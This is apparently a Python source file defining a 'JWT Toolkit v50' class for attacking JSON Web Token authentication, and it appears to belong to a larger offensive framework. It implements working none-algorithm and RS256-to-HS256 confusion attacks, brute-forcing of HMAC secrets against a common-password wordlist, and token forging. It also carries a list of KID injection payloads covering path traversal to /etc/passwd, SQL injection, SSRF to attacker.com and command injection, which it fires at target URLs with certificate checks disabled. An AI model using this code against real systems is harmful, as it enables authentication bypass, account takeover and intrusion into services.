# JWT TOOLKIT v50 — JWT Analysis & Exploitation
# ═══════════════════════════════════════════════════════════════

class JWTToolkit:
    """
    🧟 JWT TOOLKIT v50 — JSON Web Token Analysis & Exploitation.
    
    Features:
    - Auto-detect JWT tokens in headers, cookies, URLs, response bodies
    - Decode JWT header & payload without verification
    - Algorithm confusion attack (RS256 → HS256, ES256 → HS256)
    - None algorithm attack (alg:none)
    - Weak HMAC secret brute-force (1000+ common secrets)
    - KID (Key ID) injection (path traversal, SQLi, RCE)
    - JKU/JWK (JWK Set URL) spoofing
    - Token expiration check
    - Audience & issuer validation
    - JWT injection in different locations
    - JWKS endpoint discovery & analysis
    - Token replay detection
    - Cross-service JWT reuse detection
    
    Connected to: OAuthFlowHijacker, Database
    """
    
    JWT_PATTERNS: ClassVar[List[str]] = [
        r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
        r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.',
    ]
    
    COMMON_SECRETS: ClassVar[List[str]] = [
        "secret", "password", "123456", "admin", "key",
        "private_key", "secret_key", "jwt_secret", "changeme",
        "test", "development", "dev", "staging", "prod",
        "company_name", "app_name", "project_name",
        "super_secret", "my_secret", "your_secret",
        "this_is_secret", "very_secret", "top_secret",
        "s3cr3t", "p@ssw0rd", "P@$$w0rd",
        "qwerty", "letmein", "monkey", "dragon",
        "master", "hello", "world", "football", "baseball",
        "iloveyou", "trustno1", "sunshine", "princess",
        "welcome", "shadow", "ashley", "michael",
        "jwt_secret_key", "jwt_private_key", "jwt_public_key",
        "auth_secret", "authentication_secret",
        "api_secret_key", "api_private_key",
        "token_secret", "token_key",
        "my_jwt_secret", "my_token_secret",
        "secret123", "key123", "pass123",
    ]
    
    # KID injection payloads
    KID_INJECTIONS: ClassVar[List[Dict]] = [
        {"payload": "../../../../etc/passwd", "type": "path_traversal", "description": "Read /etc/passwd via KID"},
        {"payload": "../../../../dev/null", "type": "path_traversal_devnull", "description": "Use /dev/null as key file"},
        {"payload": "1' UNION SELECT 'secret'--", "type": "sqli", "description": "SQL injection in KID"},
        {"payload": "1' OR '1'='1", "type": "sqli_auth", "description": "SQL auth bypass in KID"},
        {"payload": "file:///etc/passwd", "type": "file_protocol", "description": "File protocol in KID"},
        {"payload": "http://attacker.com/jwks.json", "type": "ssrf", "description": "SSRF via KID to attacker server"},
        {"payload": "${7*7}", "type": "ssti", "description": "SSTI in KID parameter"},
        {"payload": "'; id; '", "type": "cmdi", "description": "Command injection in KID"},
    ]
    
    def __init__(
        self,
        target_url: str = "",
        zombie_instance: Optional[Any] = None,
        db: Optional[Any] = None,
        custom_wordlist: Optional[List[str]] = None,
    ):
        """
        Initialize JWT Toolkit v50.
        
        Args:
            target_url: Optional target URL
            zombie_instance: Optional shared Zombie instance
            db: Optional database instance
            custom_wordlist: Optional custom secret wordlist
        """
        self.target_url = target_url
        self._zombie = zombie_instance
        self.db = db
        
        self.discovered_tokens: List[Dict] = []
        self.vulnerabilities: List[Dict] = []
        self.cracked_secrets: List[Dict] = []
        self.forged_tokens: List[Dict] = []
        self.jwks_endpoints: List[str] = []
        self.stats = Counter()
        
        # Extend wordlist if custom provided
        if custom_wordlist:
            self.COMMON_SECRETS = list(set(self.COMMON_SECRETS + custom_wordlist))
        
        self.session_id = dhash(str(time.time()), 12)
    
    def discover_tokens(self, data: str, source: str = "unknown") -> List[Dict]:
        """
        Discover JWT tokens in a string.
        
        Args:
            data: String to search for JWTs
            source: Source description (header, cookie, body, url)
            
        Returns:
            List of discovered token dicts
        """
        tokens = []
        
        for pattern in self.JWT_PATTERNS:
            for match in re.finditer(pattern, data):
                token = match.group(0)
                decoded = self._decode_jwt(token)
                
                if decoded:
                    token_dict = {
                        "token": token,
                        "header": decoded.get("header", {}),
                        "payload": decoded.get("payload", {}),
                        "source": source,
                        "found_at": datetime.now(timezone.utc).isoformat(),
                        "length": len(token),
                    }
                    tokens.append(token_dict)
                    self.discovered_tokens.append(token_dict)
        
        self.stats["tokens_discovered"] += len(tokens)
        return tokens
    
    def discover_tokens_in_response(self, response: Dict, url: str = "") -> List[Dict]:
        """
        Discover JWT tokens in HTTP response.
        
        Args:
            response: HTTP response dict
            url: Request URL
            
        Returns:
            List of discovered token dicts
        """
        tokens = []
        
        # Check headers
        headers = response.get("headers", {})
        for header_name, header_value in headers.items():
            if isinstance(header_value, str):
                found = self.discover_tokens(header_value, f"header:{header_name}")
                tokens.extend(found)
        
        # Check cookies
        cookies = response.get("cookies", {})
        for cookie_name, cookie_value in cookies.items():
            found = self.discover_tokens(str(cookie_value), f"cookie:{cookie_name}")
            tokens.extend(found)
        
        # Check body
        body = response.get("text", response.get("body", ""))
        if body:
            found = self.discover_tokens(body, "body")
            tokens.extend(found)
        
        # Check URL
        if url:
            found = self.discover_tokens(url, "url")
            tokens.extend(found)
        
        return tokens
    
    def _decode_jwt(self, token: str) -> Optional[Dict]:
        """Decode JWT without verification."""
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return None
            
            def pad_b64(s: str) -> str:
                return s + "=" * (4 - len(s) % 4)
            
            header_b64 = pad_b64(parts[0])
            payload_b64 = pad_b64(parts[1])
            
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            
            return {"header": header, "payload": payload}
        except Exception:
            return None
    
    def analyze_token(self, token_dict: Dict) -> Dict:
        """
        Analyze a JWT token for vulnerabilities.
        
        Args:
            token_dict: Token dictionary from discover_tokens
            
        Returns:
            Analysis results with vulnerabilities
        """
        analysis = {
            "token_id": dhash(token_dict.get("token", ""), 8),
            "vulnerable": False,
            "issues": [],
            "exploit_available": False,
        }
        
        header = token_dict.get("header", {})
        payload = token_dict.get("payload", {})
        
        alg = header.get("alg", "")
        
        # Check algorithm
        if alg == "none" or alg == "None" or alg == "NONE":
            analysis["vulnerable"] = True
            analysis["exploit_available"] = True
            analysis["issues"].append({
                "type": "none_algorithm",
                "severity": "CRITICAL",
                "detail": "JWT accepts 'none' algorithm — signature verification bypassed",
                "exploit": "Remove signature, set alg to 'none'",
            })
        
        if alg and alg.startswith("HS"):
            analysis["issues"].append({
                "type": "hmac_algorithm",
                "severity": "HIGH",
                "detail": f"HMAC-based JWT with algorithm {alg} — susceptible to brute-force",
                "exploit": "Brute-force HMAC secret, then forge tokens",
            })
        
        if alg and alg.startswith("RS"):
            analysis["issues"].append({
                "type": "rsa_algorithm",
                "severity": "HIGH",
                "detail": "RSA-based JWT — test RS256→HS256 confusion attack",
                "exploit": "Use public key as HMAC secret for algorithm confusion",
            })
        
        # Check expiration
        exp = payload.get("exp")
        if exp:
            try:
                exp_time = datetime.fromtimestamp(exp, tz=timezone.utc)
                if exp_time < datetime.now(timezone.utc):
                    analysis["issues"].append({
                        "type": "expired_token",
                        "severity": "INFO",
                        "detail": f"Token expired at {exp_time.isoformat()}",
                    })
            except Exception:
                pass
        else:
            analysis["issues"].append({
                "type": "no_expiration",
                "severity": "MEDIUM",
                "detail": "Token has no expiration — valid indefinitely",
            })
        
        # Check not-before
        nbf = payload.get("nbf")
        if not nbf:
            analysis["issues"].append({
                "type": "no_nbf",
                "severity": "LOW",
                "detail": "No 'nbf' claim — token can be used immediately",
            })
        
        # Check KID parameter
        if "kid" in header:
            kid = header["kid"]
            analysis["issues"].append({
                "type": "kid_present",
                "severity": "MEDIUM",
                "detail": f"KID parameter present: {kid} — test KID injection",
                "exploit": "Inject path traversal, SQLi, or command injection in KID",
            })
        
        # Check JKU parameter
        if "jku" in header:
            jku = header["jku"]
            analysis["issues"].append({
                "type": "jku_present",
                "severity": "HIGH",
                "detail": f"JKU parameter present: {jku} — test JWKS spoofing",
                "exploit": "Host malicious JWKS and point JKU to it",
            })
        
        # Check JWK parameter
        if "jwk" in header:
            analysis["issues"].append({
                "type": "jwk_embedded",
                "severity": "MEDIUM",
                "detail": "JWK embedded in header — check if own keys accepted",
            })
        
        # Check issuer
        iss = payload.get("iss")
        if iss:
            if "http://" in str(iss):
                analysis["issues"].append({
                    "type": "http_issuer",
                    "severity": "LOW",
                    "detail": f"Issuer uses HTTP: {iss}",
                })
        
        if analysis["vulnerable"] or len(analysis["issues"]) >= 3:
            self.stats["vulnerable_tokens"] += 1
        
        return analysis
    
    async def test_none_algorithm(self, token_dict: Dict, session) -> Dict:
        """Test None algorithm attack."""
        original_token = token_dict.get("token", "")
        if not original_token:
            return {"vulnerable": False, "reason": "No token provided"}
        
        try:
            parts = original_token.split(".")
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            
            # Set algorithm to none
            header["alg"] = "none"
            
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).rstrip(b"=").decode()
            new_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).rstrip(b"=").decode()
            
            none_token = f"{new_header}.{new_payload}."
            
            # Test the forged token
            test_url = self.target_url or token_dict.get("source_url", "")
            if test_url:
                headers = {"Authorization": f"Bearer {none_token}"}
                if self._zombie:
                    headers.update(self._zombie.get_headers(test_url))
                
                async with session.get(
                    test_url, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False,
                ) as resp:
                    if resp.status == 200:
                        return {
                            "vulnerable": True,
                            "technique": "none_algorithm",
                            "none_token": none_token,
                            "status": resp.status,
                            "evidence": f"None algorithm token accepted — status {resp.status}",
                            "impact": "CRITICAL — Full token forgery possible",
                        }
        except Exception:
            pass
        
        return {"vulnerable": False, "reason": "None algorithm rejected"}
    
    async def test_algorithm_confusion(self, token_dict: Dict, public_key_pem: str, session) -> Dict:
        """
        Test RS256→HS256 algorithm confusion attack.
        
        Args:
            token_dict: Token dictionary
            public_key_pem: RSA public key in PEM format
            session: aiohttp session
            
        Returns:
            Attack result dict
        """
        original_token = token_dict.get("token", "")
        if not original_token or not public_key_pem:
            return {"vulnerable": False, "reason": "No token or public key"}
        
        try:
            parts = original_token.split(".")
            header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
            
            # Change algorithm to HS256
            header["alg"] = "HS256"
            
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).rstrip(b"=").decode()
            new_payload = base64.urlsafe_b64encode(
                json.dumps(payload).encode()
            ).rstrip(b"=").decode()
            
            message = f"{new_header}.{new_payload}"
            
            # Use public key as HMAC secret
            signature = base64.urlsafe_b64encode(
                hmac.new(public_key_pem.encode(), message.encode(), hashlib.sha256).digest()
            ).rstrip(b"=").decode()
            
            forged_token = f"{message}.{signature}"
            
            # Test
            test_url = self.target_url
            if test_url:
                headers = {"Authorization": f"Bearer {forged_token}"}
                async with session.get(
                    test_url, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False,
                ) as resp:
                    if resp.status == 200:
                        return {
                            "vulnerable": True,
                            "technique": "algorithm_confusion",
                            "forged_token": forged_token,
                            "status": resp.status,
                            "evidence": f"Algorithm confusion successful — status {resp.status}",
                        }
        except Exception:
            pass
        
        return {"vulnerable": False, "reason": "Algorithm confusion failed"}
    
    async def brute_force_secret(self, token_dict: Dict, max_attempts: int = 1000) -> List[Dict]:
        """
        Brute-force weak HMAC secrets.
        
        Args:
            token_dict: Token dictionary
            max_attempts: Maximum number of attempts
            
        Returns:
            List of cracked secrets
        """
        original_token = token_dict.get("token", "")
        header = token_dict.get("header", {})
        alg = header.get("alg", "HS256")
        
        if not alg.startswith("HS"):
            return []
        
        parts = original_token.split(".")
        if len(parts) < 3:
            return []
        
        message = f"{parts[0]}.{parts[1]}"
        target_signature = parts[2]
        
        cracked = []
        
        # Try common secrets
        for secret in self.COMMON_SECRETS[:max_attempts]:
            for hash_func in [hashlib.sha256, hashlib.sha384, hashlib.sha512]:
                try:
                    computed = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), message.encode(), hash_func).digest()
                    ).rstrip(b"=").decode()
                    
                    if computed == target_signature:
                        cracked.append({
                            "secret": secret,
                            "algorithm": alg,
                            "hash": hash_func.__name__,
                        })
                        self.cracked_secrets.append({
                            "secret": secret,
                            "token_id": dhash(original_token, 8),
                            "cracked_at": datetime.now(timezone.utc).isoformat(),
                        })
                except Exception:
                    continue
            
            if len(cracked) > 0:
                break
        
        self.stats["cracked_secrets"] += len(cracked)
        return cracked
    
    def forge_token(
        self,
        payload: Dict,
        secret: str = "",
        algorithm: str = "HS256",
        header_extras: Optional[Dict] = None,
    ) -> str:
        """
        Forge a new JWT token.
        
        Args:
            payload: JWT payload claims
            secret: Signing secret/key
            algorithm: Signing algorithm
            header_extras: Extra header parameters
            
        Returns:
            Forged JWT token string
        """
        header = {"alg": algorithm, "typ": "JWT"}
        if header_extras:
            header.update(header_extras)
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).rstrip(b"=").decode()
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).rstrip(b"=").decode()
        
        message = f"{header_b64}.{payload_b64}"
        
        if algorithm == "none":
            return f"{message}."
        
        hash_map = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }
        
        hash_func = hash_map.get(algorithm, hashlib.sha256)
        signature = base64.urlsafe_b64encode(
            hmac.new(secret.encode(), message.encode(), hash_func).digest()
        ).rstrip(b"=").decode()
        
        forged = f"{message}.{signature}"
        self.forged_tokens.append({
            "token": forged,
            "payload": payload,
            "algorithm": algorithm,
            "forged_at": datetime.now(timezone.utc).isoformat(),
        })
        
        return forged
    
    async def test_kid_injection(self, token_dict: Dict, session) -> List[Dict]:
        """Test KID injection attacks."""
        results = []
        original_token = token_dict.get("token", "")
        if not original_token:
            return results
        
        for injection in self.KID_INJECTIONS:
            try:
                parts = original_token.split(".")
                header = json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + "=="))
                
                # Inject KID payload
                header["kid"] = injection["payload"]
                
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header).encode()
                ).rstrip(b"=").decode()
                new_payload = base64.urlsafe_b64encode(
                    json.dumps(payload).encode()
                ).rstrip(b"=").decode()
                
                modified_token = f"{new_header}.{new_payload}.{parts[2] if len(parts) > 2 else ''}"
                
                test_url = self.target_url
                if test_url:
                    headers = {"Authorization": f"Bearer {modified_token}"}
                    async with session.get(
                        test_url, headers=headers,
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False,
                    ) as resp:
                        body = await resp.text()
                        
                        # Check for interesting responses
                        if resp.status != 401 and resp.status != 403:
                            results.append({
                                "technique": injection["type"],
                                "payload": injection["payload"],
                                "status": resp.status,
                                "response": body[:200],
                                "vulnerable": True,
                            })
            except Exception:
                continue
        
        return results
    
    async def discover_jwks(self, session) -> List[str]:
        """Discover JWKS endpoints on target."""
        jwks_paths = [
            "/.well-known/jwks.json",
            "/.well-known/jwks",
            "/jwks.json",
            "/api/jwks",
            "/auth/jwks",
            "/oauth/jwks",
        ]
        
        async with aiohttp.ClientSession() as sess:
            for path in jwks_paths:
                url = urljoin(self.target_url, path)
                try:
                    headers = {}
                    if self._zombie:
                        headers = self._zombie.get_headers(url)
                    
                    async with sess.get(
                        url, headers=headers,
                        timeout=aiohttp.ClientTimeout(total=10),
                        ssl=False,
                    ) as resp:
                        if resp.status == 200:
                            body = await resp.text()
                            if "keys" in body or "kty" in body:
                                self.jwks_endpoints.append(url)
                except Exception:
                    continue
        
        return self.jwks_endpoints
    
    def get_stats(self) -> Dict:
        """Get toolkit statistics."""
        return {
            "tokens_discovered": self.stats.get("tokens_discovered", 0),
            "vulnerable_tokens": self.stats.get("vulnerable_tokens", 0),
            "cracked_secrets": self.stats.get("cracked_secrets", 0),
            "forged_tokens": len(self.forged_tokens),
            "jwks_endpoints": len(self.jwks_endpoints),
            "kid_injections": len(self.KID_INJECTIONS),
            "wordlist_size": len(self.COMMON_SECRETS),
        }


